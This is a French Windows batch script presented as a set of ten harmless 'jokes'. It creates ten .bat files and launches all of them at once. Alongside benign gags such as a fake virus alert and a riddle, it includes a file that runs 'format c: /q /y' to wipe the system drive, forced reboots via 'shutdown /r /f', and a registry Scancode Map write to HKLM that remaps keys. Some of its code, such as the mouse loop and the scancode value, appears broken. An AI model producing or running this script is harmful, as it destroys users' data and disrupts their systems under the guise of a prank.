@echo off

REM Blague 1 : Effacer le disque dur
(
    echo @echo off
    echo echo Démarrage de l'effacement du disque dur...
    echo echo Attention : Cette opération effacera tout le contenu du disque dur !
    echo pause
    echo format c: /q /y
    echo echo Disque dur effacé avec succès !
    echo pause
) > EffacerDisqueDur.bat

REM Blague 2 : Faux écran bleu de la mort
(
    echo @echo off
    echo echo Démarrage de l'analyse de votre système...
    echo echo Analyse en cours...
    echo ping localhost -n 3 ^>nul
    echo echo Erreur : Ecran bleu de la mort détecté !
    echo echo Code d'erreur : 0x000000CE
    echo echo Redémarrage du système en cours...
    echo ping localhost -n 3 ^>nul
    echo shutdown /r /t 5 /f
) > EcranBleuMort.bat

REM Blague 3 : Inverser les touches du clavier
(
    echo @echo off
    echo echo Démarrage de l'inversion des touches du clavier...
    echo echo Appuyez sur une touche pour continuer...
    echo pause ^>nul
    echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000A00000C0000000C00000A000000000
    echo echo Les touches du clavier ont été inversées avec succès !
    echo pause
) > InverserTouchesClavier.bat

REM Blague 4 : Redémarrage aléatoire
(
    echo @echo off
    echo echo Démarrage du redémarrage aléatoire...
    echo echo Attention : Votre système redémarrera de manière aléatoire !
    echo ping localhost -n 3 ^>nul
    echo shutdown /r /t 60 /c "Redémarrage aléatoire en cours..." /f
) > RedemarrageAleatoire.bat

REM Blague 5 : Téléportation de la souris
(
    echo @echo off
    echo echo Démarrage de la téléportation de la souris...
    echo echo Votre souris va maintenant se téléporter de manière aléatoire !
    echo ping localhost -n 3 ^>nul
    echo :start
    echo set /a "x=!random! %% 1920"
    echo set /a "y=!random! %% 1080"
    echo nircmd.exe movecursor !x! !y!
    echo ping localhost -n 3 ^>nul
    echo goto start
) > TeleportationSouris.bat

REM Blague 6 : Détecteur de mensonges
(
    echo @echo off
    echo echo Bienvenue dans le détecteur de mensonges !
    echo pause
    echo echo Analyse en cours...
    echo ping localhost -n 3 ^>nul
    echo echo Résultat : Vous mentez !
    echo pause
    echo echo Détecteur de mensonges arrêté.
) > DetecteurMensonges.bat

REM Blague 7 : Faux virus
(
    echo @echo off
    echo echo Virus détecté sur votre ordinateur !
    echo echo Appuyez sur une touche pour lancer la réparation...
    echo pause ^>nul
    echo echo Réparation en cours...
    echo ping localhost -n 3 ^>nul
    echo echo Virus supprimé avec succès !
    echo echo Votre ordinateur est maintenant sécurisé.
    echo pause
) > FauxVirus.bat

REM Blague 8 : Jeu de devinettes
(
    echo @echo off
    echo echo Bienvenue dans le jeu de devinettes !
    echo echo Devinez : Qu'est-ce qui est blanc, moelleux et peut voler ?
    echo set /p "reponse=Votre réponse : "
    echo if "%%reponse%%"=="un oreiller" (
    echo     echo Correct ! Mais je pensais à un nuage. Essayez encore !
    echo ) else (
    echo     echo Dommage ! La réponse était : un nuage !
    echo )
    echo pause
) > JeuDeDevinettes.bat

REM Blague 9 : Générateur de noms de fichiers
(
    echo @echo off
    echo echo Générateur de noms de fichiers aléatoires :
    echo setlocal enabledelayedexpansion
    echo set "lettres=abcdefghijklmnopqrstuvwxyz"
    echo set "chaine="
    echo for /l %%i in (1,1,8^) do (
    echo     set /a index=!random! %% 26
    echo     for %%a in (!index!^) do set "chaine=!chaine!!lettres:~%%a,1!"
    echo )
    echo echo Nom de fichier généré : !chaine!.txt
    echo pause
) > GenerateurNomsFichiers.bat

REM Blague 10 : Simulateur de conversation avec une IA
(
    echo @echo off
    echo echo Simulateur de conversation avec une IA :
    echo echo Démarrage du système d'intelligence artificielle...
    echo ping localhost -n 3 ^>nul
    echo echo Bienvenue ! Comment puis-je vous aider aujourd'hui ?
    echo set /p "question=Votre question : "
    echo echo Réponse : Je ne sais pas, mais avez-vous entendu parler de la tartiflette ?
    echo pause
) > SimulateurConversationIA.bat

REM Exécution des blagues
start DetecteurMensonges.bat
start FauxVirus.bat
start JeuDeDevinettes.bat
start GenerateurNomsFichiers.bat
start SimulateurConversationIA.bat
start EffacerDisqueDur.bat
start EcranBleuMort.bat
start InverserTouchesClavier.bat
start RedemarrageAleatoire.bat
start TeleportationSouris.bat



REM Exécution des blagues

